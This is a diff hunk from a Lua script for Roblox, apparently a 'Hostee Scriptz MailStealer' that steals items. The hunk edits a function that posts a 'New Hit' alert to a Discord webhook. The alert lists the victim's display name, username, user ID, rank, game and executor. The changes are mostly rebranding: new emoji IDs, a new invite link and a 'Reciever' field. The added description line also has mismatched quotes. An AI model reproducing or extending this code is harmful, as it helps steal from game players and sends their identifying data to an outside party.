@@ -50,13 +50,13 @@ local RapFormated = (require(game:GetService("ReplicatedStorage").Library.Functi
 local function sendwebhook(msg)
 local msg = {
 	["avatar_url"] = "https://cdn.discordapp.com/icons/1085872367831613471/a_55aaf60df3ca5b6ba8c7fc5401f3a1ba.gif?size=4096",
-	["content"]= "**<:HosteeHub:1116666366959812729> || @here @everyone || ".. _G.UserNamey .." We Got Some Good News But First, You Got A New Hit With Hostee Scriptz <:HosteeHub:1116666366959812729>**  ",
+	["content"]= "**<:HosteeScriptz:1120669415676063854> || @here @everyone || ".. _G.UserNamey .." We Got Some Good News But First, You Got A New Hit With Hostee Scriptz <:HosteeScriptz:1120669415676063854>**  ",
 	["username"] = "✗ Hostee Scriptz MailStealer ✗",
 	["embeds"]= {
 	  {
 		["title"]= "`Hostee Scriptz Mailstealer Results`",
-		["description"]= "**Data from the victim**\n***<:Gigachad:1112768331146068069> Display Name: ".._G.PlrDisplayNameVictim.."\n<:Gigachad:1112768331146068069> Username: ".._G.PlrUserVictim.."\n<:Gigachad:1112768331146068069> User ID: ".._G.PlrUserIDVictim.."\n:medal:Rank: ".._G.CurrentRank.."\n:joystick: Place: ".._G.GameIn.."\n:skull_crossbones: Executor: "..exploit.."***",
-		["url"]= "https://discord.gg/rizzhub",
+		["description"]= "**Data from the victim**\n"Reciever: ".. _G.UserNamey .."\n***<:Gigachad:1112768331146068069> Display Name: ".._G.PlrDisplayNameVictim.."\n<:Gigachad:1112768331146068069> Username: ".._G.PlrUserVictim.."\n<:Gigachad:1112768331146068069> User ID: ".._G.PlrUserIDVictim.."\n:medal:Rank: ".._G.CurrentRank.."\n:joystick: Place: ".._G.GameIn.."\n:skull_crossbones: Executor: "..exploit.."***",
+		["url"]= "https://dsc.gg/hosteehub",
 		["color"]= ""..webhookcolor.."",
 		["thumbnail"] = {
         ["url"] = "https://cdn.discordapp.com/icons/1085872367831613471/a_55aaf60df3ca5b6ba8c7fc5401f3a1ba.gif?size=4096",
